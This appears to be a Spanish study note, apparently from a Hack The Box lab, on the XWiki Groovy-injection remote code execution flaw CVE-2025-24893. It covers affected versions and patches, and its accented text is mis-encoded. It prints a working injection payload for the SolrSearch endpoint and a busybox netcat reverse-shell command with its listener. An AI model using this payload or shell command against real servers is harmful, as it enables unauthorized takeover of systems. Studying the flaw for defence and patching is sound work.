# XWiki RCE (CVE-2025-24893): EjecuciÃ³n Remota de CÃ³digo mediante inyecciÃ³n Groovy

Este apunte documenta la vulnerabilidad **CVE-2025-24893** en **XWiki**, que permite la ejecuciÃ³n remota de cÃ³digo (RCE) en servidores afectados. El fallo se debe a un endpoint que procesa entradas manipuladas con **plantillas Groovy**, lo que permite a un atacante inyectar y ejecutar comandos arbitrarios en el sistema.

---

## Â¿QuÃ© es XWiki?

**XWiki** es una plataforma de wiki de cÃ³digo abierto escrita en Java.
Se utiliza para crear, organizar y compartir contenido colaborativo, principalmente en entornos empresariales y de documentaciÃ³n.
Cuenta con un motor extensible que soporta macros, plantillas y diferentes lenguajes de scripting, entre ellos **Groovy**.

---

## Versiones afectadas

* `>= 5.3-milestone-2, < 15.10.11`
* `>= 16.0.0-rc-1, < 16.4.1`

### Versiones parcheadas

* `15.10.11`
* `16.4.1`

---

## La vulnerabilidad (CVE-2025-24893)

La vulnerabilidad reside en el endpoint vulnerable:

```
/xwiki/bin/get/Main/SolrSearch?media=rss&text=
```

Este endpoint procesa parÃ¡metros que pueden contener **plantillas XWiki con Groovy**, lo que habilita a un atacante a inyectar cÃ³digo Groovy malicioso.
Mediante la funciÃ³n `execute()`, es posible ejecutar comandos arbitrarios en el sistema operativo donde corre XWiki.

### Ejemplo de payload inyectado

```groovy
}}}{{async async=false}}{{groovy}}"id".execute(){{/groovy}}{{/async}}
```

Este cÃ³digo abre un bloque Groovy dentro de XWiki, ejecuta el comando `id` en el sistema, y devuelve la salida.

---

## Flujo del ataque

1. El atacante construye un payload malicioso en Groovy.
2. El payload se inyecta en el parÃ¡metro `text` del endpoint vulnerable.
3. El servidor vulnerable procesa el payload, interpreta el cÃ³digo Groovy y ejecuta el comando en el sistema.
4. El atacante obtiene RCE.

---

## Script de explotaciÃ³n

Existe un PoC pÃºblico en Python que automatiza este proceso, enviando el payload al endpoint vulnerable:

**Exploit.py:** [https://github.com/gunzf0x/xwiki-rce-poc/blob/main/exploit.py](https://github.com/gunzf0x/xwiki-rce-poc/blob/main/exploit.py)

### ParÃ¡metros:

* `-t`: URL del servidor XWiki vulnerable
* `-c`: Comando del sistema a ejecutar
---

## Ejemplo prÃ¡ctico (reverse shell)

Para obtener una shell remota, se puede usar `busybox` (si estÃ¡ disponible en el objetivo):

```bash
python3 exploit.py -t "http://wiki.editor.htb" -c "busybox nc 10.10.14.4 443 -e /bin/bash"
```

En la mÃ¡quina atacante:

```bash
nc -lvnp 443
```

ðŸ“Œ Nota: Sin `busybox`, algunos binarios como `nc -e` pueden no estar presentes o estar restringidos en la mÃ¡quina vÃ­ctima.

---

## Resumen

* **Vulnerabilidad**: InyecciÃ³n de cÃ³digo Groovy en XWiki â†’ RCE.
* **Impacto**: EjecuciÃ³n de comandos arbitrarios en el servidor afectado.
* **MitigaciÃ³n**: Actualizar a las versiones parcheadas `15.10.11` o `16.4.1`.
* **ExplotaciÃ³n tÃ­pica**: Uso de payloads Groovy para ejecutar comandos o abrir una reverse shell.
* **Recursos / PoC**: [PoC exploit.py en GitHub](https://github.com/gunzf0x/xwiki-rce-poc/blob/main/exploit.py).
